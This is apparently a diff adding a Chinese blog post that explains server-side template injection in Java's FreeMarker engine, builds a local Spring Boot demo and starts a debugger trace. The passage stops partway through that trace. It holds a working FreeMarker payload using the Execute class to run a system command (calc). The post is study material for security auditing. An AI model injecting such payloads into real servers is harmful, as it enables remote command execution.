@@ -1,0 +1,2446 @@
+<!DOCTYPE html>
+<html>
+  <!-- meta/link... -->
+  
+
+
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+  <title>Java中的模板注入 | CurlySean&#39;s Blog</title>
+
+  <link rel="icon" type="image/png" href="/medias/logo.png">
+  <link rel="stylesheet" href="https://at.alicdn.com/t/font_1911880_c1nvbyezg17.css">
+  <link href="https://unpkg.com/@fortawesome/fontawesome-free/css/all.min.css" rel="stylesheet">
+  <link href="/js/swiper/swiper@5.4.1.min.css" rel="stylesheet">
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/animate.min.css">
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+    <link href="https://unpkg.com/@fancyapps/ui@5.0/dist/fancybox/fancybox.css" rel="stylesheet">
+  
+  
+    
+<link rel="stylesheet" href="/js/shareJs/share.min.css">
+
+  
+  <style>
+        @media (max-width: 992px) {
+            #waifu {
+                display: none;
+            }
+        }
+    </style>
+    <script defer src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
+
+    
+    
+    <!-- 依赖于jquery和vue -->
+    <script src="https://unpkg.com/jquery@3.5.1/dist/jquery.min.js"></script>
+    <script src="https://unpkg.com/vue@2.6.11/dist/vue.min.js"></script>
+
+    <!-- import link -->
+    
+        
+            
+        
+            
+        
+    
+    <!-- import script -->
+    
+        
+            
+        
+            
+        
+    
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  
+  <!-- 预加载动画 -->
+  
+  
+  <div class="preloader_6" id="loader">
+  <div class="loader"></div>
+</div>
+  <script>
+    var endLoading = function () {
+      document.body.style.overflow = 'auto';
+      document.getElementById('loader').classList.add("loaded");
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+  </script>
+
+
+  <body>
+    <!-- 判断是否为暗黑风格 -->
+    <!-- 判断是否为黑夜模式 -->
+<script defer>
+  let isDark = JSON.parse(localStorage.getItem('dark')) || JSON.parse('false');
+
+  if (isDark) {
+    $(document.body).addClass('darkModel');
+  }
+</script>
+
+    <!-- 需要在上面加载的js -->
+    <script>
+  function loadScript(src, cb) {
+    return new Promise(resolve => {
+      setTimeout(function () {
+        var HEAD = document.getElementsByTagName("head")[0] || document.documentElement;
+        var script = document.createElement("script");
+        script.setAttribute("type", "text/javascript");
+        if (cb) {
+          if (JSON.stringify(cb)) {
+            for (let p in cb) {
+              if (p == "onload") {
+                script[p] = () => {
+                  cb[p]()
+                  resolve()
+                }
+              } else {
+                script[p] = cb[p]
+                script.onload = resolve
+              }
+            }
+          } else {
+            script.onload = () => {
+              cb()
+              resolve()
+            };
+          }
+        } else {
+          script.onload = resolve
+        }
+        script.setAttribute("src", src);
+        HEAD.appendChild(script);
+      });
+    });
+  }
+
+  //https://github.com/filamentgroup/loadCSS
+  var loadCSS = function (src) {
+    return new Promise(resolve => {
+      setTimeout(function () {
+        var link = document.createElement('link');
+        link.rel = "stylesheet";
+        link.href = src;
+        link.onload = resolve;
+        document.getElementsByTagName("head")[0].appendChild(link);
+      });
+    });
+  };
+
+</script> 
+
+<!-- 轮播图所需要的js -->
+<script src="/js/swiper/swiper.min.js"></script>
+<script src="/js/swiper/vue-awesome-swiper.js"></script>
+<script src="/js/swiper/swiper.animate1.0.3.min.js"></script>
+
+<script type="text/javascript">
+  Vue.use(window.VueAwesomeSwiper)
+</script>
+
+
+  <script src="/js/vue-typed-js/index.js"></script>
+
+
+<!-- 首页的公告滚动插件的js需要重新加载 -->
+<script src="/js/vue-seamless-scroll/index.js"></script>
+
+<!-- 打字机效果js -->
+<script src="https://unpkg.com/typed.js@2.0.11"></script>
+
+
+    <div id="safearea">
+      <main class="main" id="pjax-container">
+        <!-- 头部导航 -->
+        
+<header class="header  " 
+  id="navHeader"
+  style="position: fixed;
+  left: 0; top: 0; z-index: 10;width: 100%;"
+>
+  <div class="header-content">
+    <div class="bars">
+      <div id="appDrawer" class="sidebar-image">
+  <div class="drawer-box-icon">
+    <i class="fas fa-bars" aria-hidden="true" @click="showDialogDrawer"></i>
+  </div>
+  
+  <transition name="fade">
+    <div class="drawer-box_mask" v-cloak style="display: none;" v-show="visible" @click.self="cancelDialogDrawer">
+    </div>
+  </transition>
+  <div class="drawer-box" :class="{'active': visible}">
+    <div class="drawer-box-head bg-color">
+      <img class="drawer-box-head_logo lazyload placeholder" src="/medias/logo.png" class="lazyload placeholder" data-srcset="/medias/logo.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="logo">
+      <h3 class="drawer-box-head_title">CurlySean&#39;s Blog</h3>
+      <h5 class="drawer-box-head_desc"></h5>
+    </div>
+    
+    <div class="drawer-box-content">
+      <ul class="drawer-box-content_menu">
+        
+          
+            <li class="drawer-box-content_item" style="position: relative;">
+              
+                <a href="/" class="drawer-menu-item-link">
+                  
+                    <i class="fas fa-home" aria-hidden="true"></i>
+                  
+                  <span class="name">首页</span>
+                </a>
+              
+            </li>
+          
+            <li class="drawer-box-content_item" style="position: relative;">
+              
+                <a href="/archives" class="drawer-menu-item-link">
+                  
+                    <i class="fas fa-archive" aria-hidden="true"></i>
+                  
+                  <span class="name">归档</span>
+                </a>
+              
+            </li>
+          
+            <li class="drawer-box-content_item" style="position: relative;">
+              
+                <a href="/tags" class="drawer-menu-item-link">
+                  
+                    <i class="fas fa-tags" aria-hidden="true"></i>
+                  
+                  <span class="name">标签</span>
+                </a>
+              
+            </li>
+          
+            <li class="drawer-box-content_item" style="position: relative;">
+              
+                <a href="/categories" class="drawer-menu-item-link">
+                  
+                    <i class="fas fa-bookmark" aria-hidden="true"></i>
+                  
+                  <span class="name">分类</span>
+                </a>
+              
+            </li>
+          
+        
+        
+          <li class="drawer-box-content_item">
+            <a target="_blank" rel="noopener" href="https://github.com/CurlySean">
+              <i class="fas fa-github" aria-hidden="true"></i>
+              <span>Github</span>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</div>
+
+<script>
+  var body = document.body || document.documentElement || window;
+  var vm = new Vue({
+    el: '#appDrawer',
+    data: {
+      visible: false,
+      top: 0,
+      openArr: [],
+    },
+    computed: {
+    },
+    mounted() {
+    },
+    methods: {
+      isOpen(index) {
+        if (this.openArr.includes(index)) {
+          return true;
+        } else {
+          return false;
+        }
+      },
+      openOrCloseMenu(curIndex) {
+        const index = this.openArr.indexOf(curIndex);
+        if (index !== -1) {
+          this.openArr.splice(index, 1);
+        } else {
+          this.openArr.push(curIndex);
+        }
+      },
+      showDialogDrawer() {
+        this.visible = true;
+        // 防止页面滚动，只能让弹框滚动
+        this.top = $(document).scrollTop()
+        body.style.cssText = 'width: 100%; height: 100%;overflow: hidden;';
+      },
+      cancelDialogDrawer() {
+        this.visible = false;
+        body.removeAttribute('style');
+        $(document).scrollTop(this.top)
+      }
+    },
+    created() {}
+  })
+</script>
+
+    </div>
+    <div class="blog-title" id="author-avatar">
+      
+        <div class="avatar">
+          <img src="/medias/logo.png" class="lazyload placeholder" data-srcset="/medias/logo.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="logo">
+        </div>
+      
+      <a href="/" class="logo">CurlySean&#39;s Blog</a>
+    </div>
+    <nav class="navbar">
+      <ul class="menu">
+        
+          
+            <li class="menu-item" style="position: relative;">
+              
+                <a href="/" class="menu-item-link" title="首页">
+                  
+                    <i class="fas fa-home" aria-hidden="true"></i>
+                  
+                  <span class="name">首页</span>
+                </a>
+              
+            </li>
+          
+            <li class="menu-item" style="position: relative;">
+              
+                <a href="/archives" class="menu-item-link" title="归档">
+                  
+                    <i class="fas fa-archive" aria-hidden="true"></i>
+                  
+                  <span class="name">归档</span>
+                </a>
+              
+            </li>
+          
+            <li class="menu-item" style="position: relative;">
+              
+                <a href="/tags" class="menu-item-link" title="标签">
+                  
+                    <i class="fas fa-tags" aria-hidden="true"></i>
+                  
+                  <span class="name">标签</span>
+                </a>
+              
+            </li>
+          
+            <li class="menu-item" style="position: relative;">
+              
+                <a href="/categories" class="menu-item-link" title="分类">
+                  
+                    <i class="fas fa-bookmark" aria-hidden="true"></i>
+                  
+                  <span class="name">分类</span>
+                </a>
+              
+            </li>
+          
+        
+      </ul>
+      
+      
+        <div id="appSearch">
+  <div class="search"  @click="showDialog()"><i class="fas fa-search" aria-hidden="true"></i></div>
+  <transition name="fade">
+    <div class="message-box_wrapper" style="display: none;" v-cloak v-show="dialogVisible" @click.self="cancelDialogVisible()">
+      <div class="message-box animated bounceInDown">
+        <h2>
+          <span>
+            <i class="fas fa-search" aria-hidden="true"></i>
+            <span class="title">本地搜索</span>
+          </span>
+          <i class="fas fa-times close" pointer style="float:right;" aria-hidden="true" @click.self="cancelDialogVisible()"></i>
+        </h2>
+        <form class="site-search-form">
+          <input type="text"
+            placeholder="请输入关键字"
+            id="local-search-input" 
+            @click="getSearchFile()"
+            class="st-search-input"
+            v-model="searchInput"
+          />
+        </form>
+        <div class="result-wrapper">
+          <div id="local-search-result" class="local-search-result-cls"></div>
+        </div>
+      </div>
+    </div>
+  </transition>
+</div>
+<script src="/js/local_search.js"></script>
+<script>
+  var body = document.body || document.documentElement || window;
+  var vm = new Vue({
+    el: '#appSearch',
+    data: {
+      dialogVisible: false,
+      searchInput: '',
+      top: 0,
+    },
+    computed: {
+    },
+    mounted() {
+      window.addEventListener('pjax:complete', () => {
+        this.cancelDialogVisible();
+      })
+    },
+    methods: {
+      showDialog() {
+        this.dialogVisible = true;
+        // 防止页面滚动，只能让弹框滚动
+        this.top = $(document).scrollTop()
+        body.style.cssText = 'overflow: hidden;';
+      },
+      getSearchFile() {
+        if (!this.searchInput) {
+          getSearchFile("/search.xml");
+        }
+      },
+      cancelDialogVisible() {
+        this.dialogVisible = false;
+        body.removeAttribute('style');
+        $(document).scrollTop(this.top)
+      },
+    },
+    created() {}
+  })
+</script>
+<!-- 解决刷新页面闪烁问题，可以在元素上添加display: none, 或者用vue.extend方法，详情：https://blog.csdn.net/qq_31393401/article/details/81017912 -->
+<!-- 下面是搜索基本写法 -->
+<!-- <script type="text/javascript" id="local.search.active">
+  var inputArea = document.querySelector("#local-search-input");
+  inputArea.onclick   = function(){ getSearchFile(); this.onclick = null }
+  inputArea.onkeydown = function(){ if(event.keyCode == 13) return false }
+</script> -->
+
+      
+
+    </nav>
+  </div>
+  
+    <a target="_blank" rel="noopener" href="https://github.com/CurlySean" class="github-corner color-primary" aria-label="View source on GitHub"><svg width="60" height="60" viewBox="0 0 250 250" style="fill:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+  
+  
+</header>
+        <!-- 内容区域 -->
+        
+<!-- prismjs 代码高亮 -->
+
+
+
+
+<div class="bg-dark-floor" style="position: fixed;left: 0;top: 0;width: 100%;height: 100%;z-index: -1;"></div>
+
+
+  <!-- 文章详情页顶部图片和标题 -->
+
+
+
+
+<div class="post-detail-header" id="thumbnail_canvas" style="background-repeat: no-repeat; background-size: cover; 
+  background-position: center center;position: relative;background-image:url('https://pic2.zhimg.com/80/v2-e22aaad20d20634f506f57fff0fcbc17_1440w.webp')">
+  <div class="post-detail-header-mask"></div>
+  <canvas id="header_canvas"style="position:absolute;bottom:0;pointer-events:none;"></canvas>
+  
+  <div class="post-detail-header_info-box">
+    <div class="title-box">
+      <span class="title">
+        Java中的模板注入
+      </span>
+    </div>
+    
+    
+      
+        <span class="post-detail-header_date">
+          <i class="fas fa-calendar"></i> 发表于：2025-07-31 |
+        </span>
+      
+
+      
+        <span class="post-detail-header_categories">
+          <i class="iconfont iconbookmark1"></i> 分类：
+          
+            <a href="/categories/Java/" class="post-detail-header_category">
+              Java
+            </a>
+          
+        </span>
+      
+
+      
+    
+  </div>
+  
+  
+    <script defer src="/js/bubble/bubble.js"></script>
+  
+</div>
+
+
+
+
+
+<div class="post-detail-content post-row" 
+  style="padding-top: 0px;">
+  <div class="main-content">
+    <article class="post post-detail">
+      <div class="post-content">
+        <h1 id="KKHyE">Java中的模板注入</h1>
+<h2 id="qYrMv">前言</h2>
+
+<p>最近在审计系统的时候，复现一个SSTI模板注入的漏洞，感觉SSTI的危害程度挺高的，因为感觉不是很了解原理，所以详细来学习一下SSTI漏洞</p>
+<h2 id="NzTM6">模板注入漏洞</h2>
+
+<p>SSTI（服务器端模板注入），在模板引擎解析模板时，因为代码实现的不严谨，可以将恶意代码注入到模板中，从而达到执行任意代码的功能。</p>
+<p>Java中常用的模板有三个：FreeMarker，Thymeleaf，Velocity。</p>
+<h3 id="AUZdp">FreeMarker</h3>
+
+<p>FreeMarker 是一款Java语言编写的模板引擎，它是一种基于模板和程序动态生成的数据，动态生成输出文本（HTML网页，电子邮件，配置文件，源代码等）的通用工具。它不是面向最终用户的，而是一个Java类库，是一款程序员可以嵌入他们所开发产品的组件。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753766623347-b88679ea-1b94-4440-9c13-eea5f21b30ed.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753766623347-b88679ea-1b94-4440-9c13-eea5f21b30ed.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<h4 id="WKYHX">FreeMarker基础</h4>
+<h5 id="py830">总体结构</h5>
+
+<p>FreeMarker模板文件主要有以下四个部分构成：</p>
+<ol>
+<li>文本：直接输出的地方</li>
+<li>注释：使用<code>&lt;#-- ... --&gt;</code>格式作为注释，里面的内容不会输出</li>
+<li>插值：<code>$&#123;&#125;</code>或<code>#&#123;&#125;</code>格式的部分，类似于占位符</li>
+<li>FTL指令：FTL标签和HTML标签很相似，但是它们却是给FreeMarker的指示， 而且不会打印在输 出内容中</li>
+</ol>
+<h5 id="SbVAT">插值</h5>
+
+<p>插值也叫Interpolation，即<code>$&#123;&#125;</code>或<code>#&#123;&#125;</code>格式的部分，将使用数据模型中的部分替代输出（里面的表达式可以是所有种类的表达式）</p>
+<p>插值只可以在两种位置使用：</p>
+<ul>
+<li>文本区：<code>&lt;h1&gt;Hello $&#123;name&#125;&lt;/h1&gt;</code></li>
+<li>字符串表达式：<code>&lt;#include &quot;/footer/$&#123;comppany&#125;.html&quot;&gt;</code></li>
+</ul>
+<p>以下面这个<code>.ftl</code>文件为例，<code>$&#123;name&#125;</code>的数据就会从传参中拿，一般情况下对应通过<code>addAttribute</code>中传入的name参数</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Hello $&#123;name&#125;!<span class="tag">&lt;/<span class="name">title</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">&quot;/css/main.css&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span> <span class="attr">class</span>=<span class="string">&quot;hello-title&quot;</span>&gt;</span>Hello $&#123;name&#125;!<span class="tag">&lt;/<span class="name">h2</span>&gt;</span>   </span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;/js/main.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="h28HM">内建函数</h5>
+
+<p>在FreeMarker中自带着很多的内建函数，在这些内建函数中，我们只关注一些相关危险函数：<code>api</code>、<code>new</code></p>
+<h6 id="anA3U">api内建函数</h6>
+
+<p><code>value?api</code>提供了对value的API（通常为JavaAPI）的访问，例如：</p>
+<ul>
+<li>value?api?someJavaMethod</li>
+<li>value?api.someBeanProperty</li>
+</ul>
+<p>只说很难理解，这里举一个例子：</p>
+<p>当有一个Map放入数据模型时，模板中的<code>myMap.myMethod</code>基本上翻译成了<code>((Method) myMap.get(&quot;myMethod&quot;)).invoke(...) </code>，因此我们不能调用<code>myMethod</code>。而<code>myMap?api.myMethod()</code>，就基本与<code>myMap.myMethod()</code>等价</p>
+<p><strong>PS</strong>：api_builtin_enabled为true时才可使用api函数，而该配置在2.3.22版本之后默认为false。</p>
+<h6 id="GkmNT">new内建函数</h6>
+
+<p>创建任意实现了TemplateModel接口的Java对象，同时在使用new的时候，还能够执行没有实现该接口类的静态初始化块。</p>
+<p>在FreeMarker模板注入漏洞中，我们常用的有以下这两个类：</p>
+<ul>
+<li>freemarker.template.utility.JythonRuntime</li>
+<li>freemarker.template.utility.Execute</li>
+</ul>
+<p>在<code>?</code>的左边可以指定一个字符串，为<code>TemplateModel</code>的全限定类名，使用方法如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;#assign word_wrapp &quot;com.acmee.freemarker.WordWrapperDirective&quot;&gt;new()&gt;</span><br><span class="line">&lt;#assign word_wrapp_narrow =&quot;com.acmee.freemarker.WordWrapperDirective&quot;&gt;new(40)&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="YlT3H">FreeMarker SSTI</h4>
+
+<p>SSTI的漏洞成因都是模板引擎的渲染导致的，想让Web服务器将HTML语句渲染为模板引擎，那么就需要现有HTML语句。</p>
+<p>那么想将HTML传输到服务器上，有两种方法：</p>
+<ul>
+<li>文件上传HTML</li>
+<li>系统自带模板编辑功能</li>
+</ul>
+<h5 id="PEFTn">环境搭建</h5>
+
+<p>环境搭建写的好麻烦呀…</p>
+<p>在IDEA中创建SpringBoot项目</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753769046242-555104a9-1ec2-4c3f-be32-e43e47b75f81.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753769046242-555104a9-1ec2-4c3f-be32-e43e47b75f81.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>选择导入SpringWeb和Freemarker依赖</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753769151230-a5d712e3-4a93-4283-8e9b-55858b149a4e.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753769151230-a5d712e3-4a93-4283-8e9b-55858b149a4e.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>然后在<code>/src/main/resources/application.properties</code>文件中加下如下配置（端口想改哪里改哪里）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">server.port=8888</span><br><span class="line"></span><br><span class="line"># 模板后缀名</span><br><span class="line">spring.freemarker.suffix=.ftl</span><br><span class="line"># 文档类型</span><br><span class="line">spring.freemarker.content-type=text/html</span><br><span class="line"># 页面编码</span><br><span class="line">spring.freemarker.charset=UTF-8</span><br><span class="line"># 页面缓存</span><br><span class="line">spring.freemarker.cache=false</span><br><span class="line"># 模板路径</span><br><span class="line">spring.freemarker.template-loader-path=classpath:/templates/</span><br></pre></td></tr></table></figure>
+
+<p>在<code>/src/main/resources/templates</code>目录下新建一个名为<code>index.ftl</code>的文件，内容如下</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;zh&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>FreeMarkerdemo<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">table</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span>$&#123;user.id&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span>$&#123;user.name&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>继续编写Controller</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.freemarker.demos.web;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.ui.ModelMap;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FreemarkerController</span> &#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/freemarker/index&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">fmIndex</span><span class="params">(ModelMap modelMap)</span> &#123;</span><br><span class="line">        Map&lt;String, String&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;id&quot;</span>, <span class="string">&quot;88&quot;</span>);</span><br><span class="line">        map.put(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;CurlySean&quot;</span>);</span><br><span class="line">        <span class="comment">//给模板添加上面的属性值</span></span><br><span class="line">        modelMap.addAttribute(<span class="string">&quot;user&quot;</span>, map);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;index&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>启动项目即可，访问<code>http://127.0.0.1:8888/freemarker/index</code>，环境搭建成功</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753770047888-9b74b6e1-064b-4331-8079-12449f447784.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753770047888-9b74b6e1-064b-4331-8079-12449f447784.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<h5 id="rFwHa">漏洞复现</h5>
+
+<p>在FreeMarker中SSTI，需要我们将paylaod插入到<code>.ftl</code>模板中，从个人触发漏洞，paylaod如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;#assign value=<span class="string">&quot;freemarker.template.utility.Execute&quot;</span>?<span class="keyword">new</span>()&gt;$&#123;value(<span class="string">&quot;Calc&quot;</span>)&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753770248879-240391ca-2e3c-4d2c-b02b-8faeece70c88.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753770248879-240391ca-2e3c-4d2c-b02b-8faeece70c88.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>重启后访问，可以看到成功弹出计算器</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753770333235-9c63b57b-4554-49f1-9b8a-ff08e1e26a0c.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753770333235-9c63b57b-4554-49f1-9b8a-ff08e1e26a0c.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<h5 id="USVve">漏洞分析</h5>
+我们要分析的时MVC的思维，如何走到最终的危险类`freemarker.template.utility.Execute`中的
+
+<p>在<code>org.springframework.web.servlet.view.UrlBasedViewResolver#createView</code>处下一个断点，开始我们的调试之旅</p>
+<p>这里viewName，应该就是我们的<code>return &quot;index&quot;;</code>处，中间的判断都会跳过，我们继续跟进<code>super.create.createView(viewName,locale)</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753770984182-f2f17327-4230-4ad9-98ae-55575e66eced.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753770984182-f2f17327-4230-4ad9-98ae-55575e66eced.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>进一步跟进<code>loadView</code>以及<code>buildView</code>，先create一个View试图，再load进来，最后build即可</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753772889191-227a528f-8b03-4b70-b4f0-8edd8bb82271.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753772889191-227a528f-8b03-4b70-b4f0-8edd8bb82271.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
